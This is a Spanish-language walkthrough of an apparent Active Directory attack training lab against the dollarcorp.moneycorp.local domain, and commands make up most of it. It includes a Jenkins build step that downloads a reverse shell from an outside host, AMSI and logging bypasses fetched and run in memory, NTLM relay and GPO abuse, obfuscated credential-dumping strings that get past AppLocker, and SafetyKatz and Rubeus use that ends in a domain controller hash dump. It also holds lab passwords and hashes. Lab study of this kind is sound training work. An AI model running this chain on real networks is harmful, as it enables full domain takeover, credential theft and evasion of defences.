# Enumeración

*LO - 01*
## Usuarios del dominio
Enumerar todos los usuarios del dominio quedándonos solo con el nombre de usuario
```shell
Get-DomainUser -Domain dollarcorp.moneycorp.local | select samacountname
```

## Equipos del dominio
Enumerar todos los equipos que se encuentran en el dominio
```shell
Get-DomainComputer -Domain dollarcorp.moneycorp.local | Select-Object -ExpandProperty dnshostname
```

## Administradores del dominio
Enumeraremos los usuarios pertenecientes al grupo Domain Admins
```shell
Get-DomainGroupMember -Domain dollarcorp.moneycorp.local -Identity "Domain Admins" -Recurse
```

## Enterprise Admins del dominio
Enumerar los usuarios pertenecientes al grupo Enterprise Admins del dominio
 ```shell
 Get-DomainGroupMember -Identity "Enterprise Admins" -Domain dollarcorp.moneycorp.local -Recurse
 ```

Al no mostrarnos nada enumeraremos las confianzas viendo que pertenecemos al bosque de *moneycorp.local*
```shell
Get-DomainTrust
```

Una vez descubierto el bosque adaptaremos el comando para buscar en el dominio
```shell
Get-DomainGroupMember -Identity "Enterprise Admins" -Domain moneycorp.local -Recurse
```

## Enumerar carpetas compartidas
Enumeraremos carpetas compartidas donde los nuestro usuario tenga permisos de de escritura
- Primero deberemos enumerar los equipos de la red y guardarlo en un archivo *.txt*
```shell
Get-DomainComputer | select -ExpandProperty dnshostname | Out-File -FilePath "C:\AD\Tools\servers.txt"
```

- Ahora usaremos la herramienta *PowerHuntShares* importando el modulo de *PowerHuntShares.psm1* y ejecutar *HuntSMBShares*
- Cargamos el modulo
```shell
Import-Module C:\AD\Tools\PowerHuntShares.psm1
```

- Y lo ejecutamos
```shell
Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools -HostList C:\AD\Tools\servers.txt
```

- Obteniendo información sobre los recursos compartidos a los que tenemos acceso
- Ahora podremos pasárnoslo a la maquina local y podremos enumerar con la interfaz grafica de *ShareGraph*
- Pudiendo ver ahora que el recurso compartido llamado *IA* tiene permisos de escritura para todos.

*LO - 02*
## Enumerar las ACL para el grupo de Domain Admins
Enumeraremos las ACL del grupo de Domain Admin, en caso de tener una shell iniciada con comandos recientes si da error hay que abrirse una nueva
```shell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs -Verbose
```

## Enumerar las ACL donde tenemos permisos interesante
Enumeraremos las ACL de nuestro usuario para saber si hay alguna interesante aplicada sobre el para poder intentar aprovecharnos de ella en un fututo
```shell
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student97"}
```

En caso de no ver nada sobre nuestro usuario podemos revisar a que grupos pertenecemos y hacer la enumeración de las ACL de estos
```shell
whomai /groups
```

En cado de encontrar algún grupo interesante como puede ser el de RDPUsers volvemos a lanzar la enumeración
```shell
 Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

*LO - 03*
## Enumerar las OU del dominio dollarcor.moneycorp.local
Enumeraremos todas las Unidades Organizativas del dominio actual
```shell
Get-DomainOU -Domain dollarcorp.moneycorp.local | select name, ou, distinguishedname
```

Una ves enumeradas todas las Unidades Organizativas lo siguiente que podemos hacer es enumerar todos los equipos que pertenecen a una unidad organizativa
```shell
(Get-DomainOU -Identity DevOps).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```

## Enumerar las GPO
Enumeraremos las GPO implementadas
```shell
Get-DomainGPO | select displayname
```

También podemos enumerar las GPO que están aplicadas sobre una Unidad Organizativa como puede ser DevOps
Para ello lo primero que necesitaremos sera el nombre de la directiva del atributo gplink de la Unidad Organizativa
```shell
(Get-DomainOU -Identity DevOps).gplink
```

Deberemos de copiar el valor que se encuentra entre corchetes incluyendo estos, a continuación ya podremos enumerar las GPO de la Unidad Organizativa
```shell
Get-DoaminGPO -Idenetity '{0BF8D01C-1F62-4BDC-958C-57140B67D147}'
```

*LO - 04*

## Enumerar todos los dominios en bosque *moneycorp.local*
Enumeraremos todos los dominios que se encuentran en el bosque
```shell
Get-DomainTrust -Domain dollarcorp.moneycorp.local | select TargetName,TrustAttributes,TrustDirection
```

## Enumerar las confianzas del dominio actual
Enumeraremos las confianzas de nuestro dominio pudiendo recoger las confianzas y la dirección relativa de estos
```shell
Get-DomainTrust -Domain dollarcorp.moneycorp.local
```

## Enumerar las confianzas externas al bosque *moneycorp.local*
Enumeraremos todas la confianzas externas del bosque filtrando únicamente por el SID principal
```shell
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
```

## Enumerar las relaciones de confianzas externas al dominio *dollarcorp.moneycorp.local*
Habiendo enumerado ya las confianzas del bosque y  y del dominio hemos descubierto que hay un bosque externo vamos a enumerarlo verificar las relaciones de confianza
```shell
Get-ForestDomain -Forest eurocorp.local | %{Get-DomainTrust -Domain $_.Name}
```

Dándonos cuenta que no podemos enumerar un bosque o dominio externo al nuestro si intentamos obtener mas información del dominio usando
```shell
Get-DomainForest -Forest eurocorp.local
```

Nos daremos cuenta que no lo podemos enumerar completo ya que no tenemos visibilidad con el

*LO - 05*

# Explotación
## Explotar un servicio en la maquina de estudiante y elevar los privilegios a Administrador Local

Deberemos de tener iniciada una *InviShell* y ejecutar *PowerUp.ps1*
```shell
. C:\AD\Tools\PowerUp.ps1
```

Usaremos un atributo de PowerUp el cual nos permite enumerar todos los servicios vulnerables con las opciones vulnerables habilitadas como *CanRestarr: True*, *Check: Modifiable Services* y *Unquoted service Paths*
```shell
Invoke-AllChecks
```

Hay varios servicios vulnerables, en este caso elegiremos un servicio que disponga de CanRestarr: True como es el servicio de SNMPTRAP
Para abusar de el tendremos que revisar diferentes opciones para abusar de el
```shell
help Invoke-ServiceAbuse -Example
```

Buscaremos cual es la función que nosotros requerimos, en este caso queremos añadir a nuestro usuario al grupo de Administradores Locales
```shell
Invoke-ServiceAbuse -Name 'SNMPTRAP' -UserName "scorp\student97" -verbose
```

Verificaremos si pertenecemos al grupo de Adminitradores
```shell
Get-LocalGroupMember -Group "Administrators"
```

Una vez tenemos la cuenta como usuario Administrador local podemos enumerar otras maquinas en el dominio en el que tengamos acceso como administrador local
Primero tendremos que cargar la herramienta Find-PSRemotingLocalAdminAccess.ps1
```shell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

A continuación podremos ejecutarlo viendo en que cuentas tenemos permisos de Administrador Local
```shell
Find-PSRemotingLocalAdminAccess -Verbose
```

Descubriendo permisos de administrador local en otras maquinas en este caso descubrimos permisos de Administrador en Adminsrv, por lo cual nos conectaremos a ella 
```shell
winrs -r:dcorp-adminsrv cmd
```

O también podemos usar
```shell
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

## Explotación de Jenkins 172.16.3.11:8080
```ad-todo
Antes de empezar con la explotacion deberemos identificar el servicio del que hablamos en este caso un Jenkins.
Primero deberemos extraer una lista de equipos que haya en el dominio, exportarla y a continuacion hacer una enumeracion de red sobre estos activos
```shell
$Ports = @(80,443,8080,8443,3389,445,135,5985,5986,22,1433,3306,5432)

Get-DomainComputer | Select-Object -ExpandProperty DNSHostName | ForEach-Object {

    $HostName = $_

    try {

        $IP = (Resolve-DnsName $HostName -Type A -ErrorAction Stop |
               Select-Object -First 1 -ExpandProperty IPAddress)

        $OpenPorts = foreach($Port in $Ports) {

            try {

                $TcpClient = New-Object System.Net.Sockets.TcpClient
                $Connect = $TcpClient.BeginConnect($HostName,$Port,$null,$null)

                if($Connect.AsyncWaitHandle.WaitOne(500,$false))
                {
                    $TcpClient.EndConnect($Connect)
                    $TcpClient.Close()
                    $Port
                }
                else
                {
                    $TcpClient.Close()
                }

            } catch {}
        }

        if($OpenPorts)
        {
            [PSCustomObject]@{
                DNSHostName = $HostName
                IP          = $IP
                OpenPorts   = ($OpenPorts -join ",")
            }
        }

    } catch {}
} | Format-Table -AutoSize
```

Accederemos a la web y hay un campo el cual nos muestra diferentes nombres de usuario pertenecientes a la web, antes de hacer un ataque de fuerza bruta probaremos haciendo un User as Password por si hay alguna coincidencia, en este caso *builduser::builduser*

Una vez estamos dentro podemos modificar un proyecto y enviarnos una reverse shell.
Entraremos en un proyecto, y en la parte de configuración -> Build steps podemos meter nuestra reverse shell
```shell
powershell.exe iex (iwr http://172.16.100.97/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.97 -Port 1339
```

La guardaremos y nos pondremos en escucha por el puerto indicado en esta
```shell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
```

Además al tener Privilegios de Administrador Local podremos deshabilitar las reglas de firewall
Después de tenerlo deshabilitado podemos ejecutar el servidor web HFS.exe, al cual le cargaremos los siguientes archivos: *Invoke-PowerShellTCP.ps1*, *Amsi-Byp.txt*, *Loades.exe*, *PowerView.ps1*, *SafetyKatz.exe* y *sbloggingbypass.txt*

Ahora en el Jenkins le damos a Build Now y recogeremos una reverse shell en nuestra maquina
Pudiendo interactuar ahora con la maquina que alberga el Jenkins, en este caso dcorp/ciadmin

*LO - 06*
# Escalada de privilegios
Ahora lo que haremos será escalar privilegios en la maquina de *dcorp-ci*, primero veremos las GPO que tiene implementadas desde la maquina de atacante
```shell
[studen97]
Get-DomainGPO -ComputerIdentity DCORP-CI
```

Obtenemos información de que pertenece a la politica *DevOps*, para confirmar que es así ejecutaremos el siguiente comando
```shell
[studen97]
Get-DomainGPO -Identity 'DevOps Policy'
```

En el primer laboratorio tras la enumeración descubrimos un recurso compartido en *dcorp-ci* llamado AI, nos aprovecharemos de este.
Accedemos al archivo compartido a través de la ruta `\\dcorp-ci\AI`, aquí encontramos un archivo con logs.
Leyendo el archivo comprendemos que esta ruta se usa para una automatización la cual ejecuta automáticamente accesos directos (Archivos .lnk) como usuario devopsadmin, este usuario se encuentra en la enumeración hecha con BloodHound que tiene activo WriteDACL sobre la política DevOps.
Vamos a aprovecharnos de esto usando *GPOddity*
En primer lugar tendremos que usar *ntlmrelayx* que la ejecutaremos en la maquina WSL Ubuntu para obtener las credenciales del usuario devopsadmin
```shell
sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.97 --http-port '8081' -i --no-smb-server
```
*WSLToTh3Rescue!*

Una vez ejecutado, en nuestra maquina virtual deberemos de crear en la ruta de AD\Tools un acceso directo con el siguiente payload
```shell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.97:8081' -UseDefaultCredentials"
```

Y lo copiaremos al recurso compartido dcoro-ci\AI
```shell
[studen97]
xcopy C:\AD\Tools\student97.lnk \\dcorp-ci\AI
```

La automatización ejecutara el archivo y se creara una conexión en caso de no hacerse solo le podemos hacer doble click nosotros, nos mostrara un mensaje de que se ha automatizado una conexión en el 127.0.0.1:11000 nos abriremos una nueva WSL y nos conectaremos
```shell
nc 127.0.0.1 11000
```

Habremos obtenido una shell como *devopsadmin*

Sobre este usuario intentamos darle permisos sobre la Política de DevOps con distinguishedname  {0BF8D01C-1F62-4BDC-958C-57140B67D147} usando
```shell
[dcorp\devopsadmin]
write_gpo_dacl student97 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```

```ad-warning

En caso de no poder hacerlo por que el usuario no conste en la maquina podemos crear un usuario nuevo, y luego volver a intentar añadir la GPO de nuevo
```shell
[dcorp\devopsadmin]
add_computer std97-gpattack Secretpass@123
```

Una vez tengamos la respuesta necesaria con nuestro Have Fun, deberemos de detener el interprete de comandos LDAP y el ntlmrelayx y así poder ejecutar GPOddity
```shell
[WSL]
cd /mnt/c/AD/Tools/GPOddity
```

Y ejecutar GPOddity
```shell
[WSL]
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student97' --password 'vy8HMb2BmT6xGGaM' --command 'net localgroup administrators student97 /add' --rogue-smbserver-ip '172.16.100.97' --rogue-smbserver-share 'std97-gp' --dc-ip '172.16.2.1' --smb-mode none
```

Ahora deberemos de mantenerlo corriendo y en una WSL Ubuntu nueva deberemos de comaprtir el directorio std97-pg
```shell
[WSL]
cp -r /mnt/c/AD/Tools/GPOddity/GPT_Out/* /mnt/c/AD/Tools/std97-gp
```

Deberemos abrir una nueva consola de Windows como Administrador para crear un recurso compartido std97-gp y asignarle privilegios para todos
```shell
[student97]
net share std687-gp=C:\AD\Tools\std97-gp /grant:Everyone,Full
```
```shell
icacls "C:\AD\Tools\std97-gp" /grant Everyone:F /T
```

Ahora podemos verificar si se ha modificado la ruta de *gPCfileSysPath* de la política de DevOps
```shell
[studen97]
Get-DomainGPO -Identity "DevOps Policy"
```

Esperaremos y se nos tendría que asignar a nuestro usuario al grupo de Administradores locales en dcorp-ci
Comprobaremos si se ha hecho efectivo ejecutando
```shell
[student97]
winrs -r:dcorp-ci cmd /c "set computername && set username"
```

En caso de que nos responda es que se esta ejecutando, para obtener una shell interactiva usaremos
```shell
winrs -r:dcorp-ci cmd
```

*LO -07*

# Enumeración

Actualmente tenemos acceso a dos usuarios de dominio *student97* y *ciadmin* y acceso administrativo a la maquina *dcorp-adminsrv*

También tenemos acceso a la ReverseShell de *dcorp-ci* como *ciadmin* despues de haber abusado de Jenkins
## Enumeración mediante SessionHunter
Mediante Invoke-SessionHunter podemos listar las sesiones en todas las maquinas remotas sin requerir permisos de administrador
```shell
[studen97]
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

```shell
[student97]
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```

Para que la ejecución sea mas compatible con la seguridad operativa y evitar activar herramientas como MDI, se pueden consultar maquinas objetivo especificas. Para ellos usaremos el siguiente archivo
```shell
[student97]
cat C:\AD\Tools\servers.txt
```

Ahora podremos ejecutar el SessionHunter pasándole una lista de maquinas especificas
```shell
[student97]
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
```
 
Vemos que hay una sesión de administrador de dominio (*svcadmin*) en el servidor *dcorp-mgmt*. De momento no tenemos acceso a ese servidor pero eso es algo que haremos mas adelante

## Enumeración mediante PowerView
Tenemos una reverse shell en *dcorp-ci* como *ciadmin* después e haber abusado de Jenkins
Podemos usar *PowerView* usando la opcion*Find-DomainUserLocation* en la shell de *dcorp-ci* para encontrar todas las maquinas en las que haya iniciado sesion un adminitrador de dominio, para ello lo primero que deberemos de realizar sera eludir *AMSI* y el registro mejorado

Primero deberemos de omitir el registro de bloques de script mejorado para que la omision de *AMSI* no quede registrada.
El segundo comando omite el registro de bloques de script mejorado.

Cargaremos *sbloggingbypas.txt* primero en la maquina
```shell
[dcorp-ci]
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sbloggingbypass.txt')
```

Y a continuacion cargaremos *Amsi-Byp.txy* para eludir *AMSI*
```shell
[dcorp-ci]
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-Byp.txt')
```

Ahora tendremos que cargar y ejecutar *PowerView* y ejecutar *Find-DomainUserLocation*
```shell
[dcorp-ci]
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
```

```shell
[dcorp-ci]
Find-DomainUserLocation
```

```ad-hint
UserDomain      : dcorp
UserName        : svcadmin
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :
```

Obteniedo como resultado las maquinas que tienen una sesion de Domain Admin en ellas en este caso encontramos *dcorp-mgmt*
Ahora podemos aprovechar esto usando *Winrs* o *PowerShell Remoting*

En este caso usaremos *Winrs*, primero deberemos de comprobar si podemos ejecutar comandos en el servidor *dcorp-mgmt*
```shell
[dcorp-ci]
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

Obteniendo respuesta lo que quiere decir que este esta abierto
Ahora deberemos de ejecutar *SafetyKatz* en *dcorp-mgmt* para extraer las credenciales. Para ello necesitaremos copiar el *Loader*. Primero en *dcorp-ci* y luego desde allí a *dcorp-mgmt*

Nos lo copiamos en *dcorp-ci*
```shell
[dcorp-ci]
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Ahora una vez tenemos *Loader* en *dcorp-ci* deberemos pasarlo a *dcorp-mgmt*
```shell
[dcorp-ci]
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Usando *winrs* agregamos el reenvio de puertos en *dcorp-mgmt*para eveitar la deteccion
```shell
[dcorp-ci]
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97"
```

Tendremos que usar la variable *$null* para solucionar problemas de redireccion de salida.
Para ejecutar *SafetyKatz* en *dcorp-mgmt* lo descargaremos y lo ejecutaremos en memoria usando el *Loader*
```shell
[dcorp-ci]
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

Obteniendo asi credenciales de *scvadmin -> 6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011* que es un *Domain Admin*. Esta se utiliza como cuenta de servicio (En el parametro Session se indica como 0, por lo cual es una cuenta de servicio)

Para poder usar las credneciales de *svcadmin* deberemos de realizas
### OverPass-the-Hash
Deberemos de ejejecutar los siguiente comando desde una terminal con privilegios de *Local Admin* para asi poder ejecutar *Rubeus*.
```shell
[student97]
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```ad-important
El comando anterior esta solicitando un *ticket Granting Ticket(TGT)* a traves del loader para una cuenta en este caso *svcadmin* usando el hash anterirormente descubierto.
Tambien se creara un nuevo proceso *cmd.exe* con credenciales de red aisladas (net-only logon). Teniendo asi este proceso su propio contexto de autenticacion de red.

1. Se dispone de la clave Kerberos AES de *svcadmin*
2. Se solicita un TGT para esa cuenta al controlador de dominio
3. Se crea un proceso *cmd.exe* con un contexto de red independiente
4. El TGT obtenido se carga en ese contexto
5. Desde ese proceso las conexiones Kerberos de red se haran como *svcadmin*
```

Ahora desde el nuevo proceso podemos intentar acceder al *Domain Controller*
```shell
[studen97-newProccess]
winrs -r:dcorp-dc cmd /c set username
```

Ahora deberemos de elevar los privilegios a *Domain Admin* usando un *Local Adminitrator* derivado (Una cuenta derivada se refiere a una cuenta que no es *Local Administrator* por si misma pero hereda los privilegios a traves de pertenencias a grupos).
Asi que averiguemos en que maquinas tenemos privilegios de *Local Administrator*. 
Tendremos que hacerlo en una nueva sesion de *PowerShell* iniciada con *InvisShell*
Caragaremos el *Find-PSRemotingLocalAdminAccess.ps1*
```shell
[student97]
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

Y lo ejecutaremos
```shell
Find-PSRemotingLocalAdminAccess
```

Encontrando que tenemos *Local Administrator* en *dcorp-adminsrv*. Accederemos a el usando *winrs*
```shell
[student97]
winrs -r:dcorp-adminsrv cmd
```
```shell
[student97]
Enter-PSSession dcorp-adminsrv
```

```shell
[student97]
Enter-PSSession dcorp-adminsrv
```

Verificaremos si esta *AppLocker* configurado en *dcorp-adminsrv* consultando las claves de registro. Asumiendo que *reg.exe* tiene permiso para ejecutarse
```shell
 [dcorp-adminsrv]
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

Nos encontramos con que *AppLocker* esta configurado. Entonces deberemos de revisar las politicas, para ellos deberemos enumerar todas la rutas obtenidas anteriormente.
```shell
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Appx
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Dll
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Exe
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Msi
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script
```

Despues de enumerar los binarios y los scripts, nos damos cuenta que al enumerar las reglas hay una demasiado permisiva
```shell
[dcorp-adminsrv]
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

```ad-info
Name="(Default Rule) All scripts located in the Program Files folder"
Description="Allows members of the Everyone group to run scripts that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
```

Vemos que la regla permite ejecutar en *Program Files* a todos los grupos ejecutar scripts
También lo podemos verificar accediendo por *PowerShell*
```shell
[student97]
Enter-PSSession dcorp-adminsrv
```

Deberemos de ver que modo de lenguaje permite
```shell
[dcorp-adminsrv]
$ExecutionContext.SessionState.LanguageMode
```

Y enumerar las reglas de *AppLocker*
```shell
[dcorp-adminsrv]
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Al utilizar un *ConstrainedLanguage*, no podremos usar scripts usando los puntos *. .\Invoke...*, asi que deberemos de modificar el script que vayamos a usar, en este xcaso *TheKat* para incluir la llamada de la funcion en el propio script, y despues transferir el script al servidor destino.

Tendremos que crear una copia de *Invoke-TheKat.ps1* y cambiarle el nombre a *Invoke-TheJatEx-keys std97.ps1*, Abrimos con *PowerShell ISE*, y agregamos el sigueinte valor para *token-evasive-elevate* y *sekurlsa::evasive-ekeys* al final del archivo

```shell
$jq = "t";
$hk = "o";
$cr = "k";
$dg = "e";
$z3 = "n";
$y4 = ":";
$fq = ":";
$67 = "e";
$qj = "v";
$27 = "a";
$yt = "s";
$ws = "i";
$h4 = "v";
$li = "e";
$tv = "-";
$2h = "e";
$qx = "l";
$lx = "e";
$l1 = "v";
$68 = "a";
$5d = "t";
$ny = "e";
$25 = " ";
$d9 = "s";
$9z = "e";
$8x = "k";
$r2 = "u";
$6x = "r";
$zq = "l";
$06 = "s";
$td = "a";
$hb = ":";
$gz = ":";
$nx = "e";
$0n = "v";
$qz = "a";
$ct = "s";
$mj = "i";
$ue = "v";
$sf = "e";
$2c = "-";
$9u = "e";
$hp = "k";
$x0 = "e";
$yb = "y";
$r1 = "s";
$Pwn = $jq + $hk + $cr + $dg + $z3 + $y4 + $fq + $67 + $qj + $27 + $yt + $ws + $h4 + $li + $tv + $2h + $qx + $lx + $l1 + $68 + $5d + $ny + $25 + $d9 + $9z + $8x + $r2 + $6x + $zq + $06 + $td + $hb + $gz + $nx + $0n + $qz + $ct + $mj + $ue + $sf + $2c + $9u + $hp + $x0 + $yb + $r1 ;

Invoke-TheKat -Command $Pwn
```

Ahora nos transferiremos el archivo a la maquina de *dcorp-adminsrv*
```shell
[student97]
Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Y en la maquiona victima navegaremos a *C:\'Program Files'* y lo ejecutamos
```shell
[dcorp-adminsrv]
 .\Invoke-TheKatEx-keys-std97.ps1
```

Qui encontramos credenciales de los ususarios *dcorp-adminsrv$*, *appadmin* y *websvc*
```ad-hint
[des_cbc_md4]
dcorp-adminsrv$ -> e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51
websvc -> 2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7
appadmin -> 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb
```

```ad-info
EL uso del $ detras de un nombre de usuario, quiere decir que es una cuenta de equipo
```

También se pueden buscar las credenciales usando El mismo *Invoke-TheKat* pero en vez de hacer la modificacion anterior deberemos de reemplazar *Invoke-TheKat -Command '"sekurlsa::ekeys"'* por *nvoke-Mimi -Command '"token::evasive-elevate" "vault::cred /patch"'* , lo transferimos de nuevo a la maquina de *dcorp-adminsrv* 
```shell
[student97]
 Copy-Item C:\AD\Tools\Invoke-TheKatEx-vault-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Y despues lo ejecutaremows
```shell
[dcopr-adminsrv]
.\Invoke-TheKatEx-vault-std97.ps1
```

Encontrando las credenciales en texto claro del usuario *dcorp-srvadmin::TheKeyUs3ron@anyMachine!*
Ahora iniciaremos un nuevo proceso con los privilegios de *srvadmin*
```shell
[student97]
runas /user:dcorp\srvadmin /netonly cmd
```

Iniciaremos una *InviShell*
```shell
[newShell as srvadmin privileges - PS]
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

Cargaremos *Find-PSRemotingLocalAdminAcces* para ver sobre que otras maquinas tenemos privilegios de Administrador
```shell
[newShell as srvadmin privileges - PS]
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

Y lo ejecutamos
```shell
[newShell as srvadmin privileges - PS]
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
```

Obteniendo como respuesta que tenemos privilegios de administrador en *dcorp-mgmt*
También sabemos que en esa maquina también esta presente una sesion de *dcorp-svcadmin*.
Utilizaremos *SafetyKatz* para extraer las credenciales de la maquina *dcorp-mgmt*, primero nos transferiremos el *Loader* a la maquina
Primero tendremos que hacer un exit de la *PowerShell*
```shell
[newShell as srvadmin privileges - CMD]
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Una vez copiado el *Loader* ejecutaremos *SafetyKatz* a traves de *winrs*
```shell
[newShell as srvadmin privileges - CMD]
winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.97:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
```

Obtenemos las credenciales de *svcadmin ->  6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011*

Ahora deshabilitaremos el *AppLocker* en *dcorp-adminsrv* modificando la GPO
Recordamos que nuestro usuario *studen97* tiene *Full Control/Generic All* sobre la politica de grupo de *AppLocker*, desactivaremos este *AppLocker* en *dcorp-adminsrv*

Necesitaremos iniciar una consolapara la gestion de politicas de grupos deberemos descargala de la siguiente forma *Open Server Manager -> Add Roles and Features -> Next -> Features -> Check Group Policy Management -> Next -> Install*

Una vez instalada deberemos iniciar *gpmc* ejecutando una shell en un nuevo proceso con una shell de privilegios elevados.
```shell
[student97]
runas /user:dcorp\studentx /netonly cmd
```

Tendremos que el Gestor de Politicas de Grupo
```shell
[newShell as student97 privileges]
gpmc.msc
```

En este navegaremos a la sigueinte ruta *Forest -> Domains -> dollarcorp.moneycorp.local -> Applocked -> Right click on the Applocker policy* le darwemos click dereco y editar

En la nueva ventana navegaremos  a *Computer Configuration -> Expand Policies -> Windows Settings -> Security Settings -> Application Control Policies -> Applocker -> Executable Rules*

En las reglas ejecutables vemos que cualquiera puede ejecutar binarios firmado por Microsoft
En las reglas de scripts vemos que cualquioera puede ejecutar scripts firmados por Microsoft desde cualquier ruta y dos reglas mas que permiten ejecutarlos desde *C:\Windows* y *C:\Program Files*

Eliminaremos la regla ejecutable por que la regla de scripts es la que acabamos de abusar de ella
Ahora podemos esperar a la actualizacion de la directiva de grupo, o forzarla en la maquina *dcorp-adminsrv*
Lo haremos desde nuestra maquina estudiante, conectandonos a *adminsrv*
```shell
[student97]
winrs -r:dcorp-adminsrv cmd
```

Forzaremos la actualización de las GPO
```shell
[dcorp-adminsrv]
gpupdate /force
```

Ahora copiaremos el *Loader* a la maquina
```shell
[student97]
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
```

Haremos la redirección de puertos
```shell
[dcorp-adminsrv]
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
```

Y ejecutaremos el *SafetyKatz*
```shell
[dcorp-adminsrv]
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

Obteniendo al credencial del usuario *appadmin -> 68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb*

*LO - 08*
### Extraer secrets del Domain Controller
Primero deberemos de ejecutar un proceso con privilegios de Domain Admin, para ello ejecutaremos una CMD con privilegios elevados
```shell
[student97]
runas /user:dcorp\student97 /netonly cmd
```

Y extraeremos los secrets usando *SafetyKatz*, tendremos que pasar el usuario y el hash de *appadmin*
```shell
[newShell as student97 privileges]
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Se nos ejecutara a continuacion un proceso CMD como *Domain Admin*
Copiaremos el *Loader* al *dcorp-dc*
```shell
[newShell as Domain Admin privileges]
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

Una vez copiado nos conectaremos al *dcorp-dc* usando *winrs*
```shell
[newShell as Domain Admin privileges]
winrs -r:dcorp-dc cmd
```

Una vez conectados haremos un reenvio de puertos hacia nuestra maquina de atacante
```shell
[newShell as Doamin Admin privileges]
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
```

Y ahora extraeremos los secrets de las cuentas
```shell
[newShell as Doamin Admin privileges]
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```

Obteniendo el hash de *krbtgt -> 4e9815869d2090ccfca61c1fe0d23986*
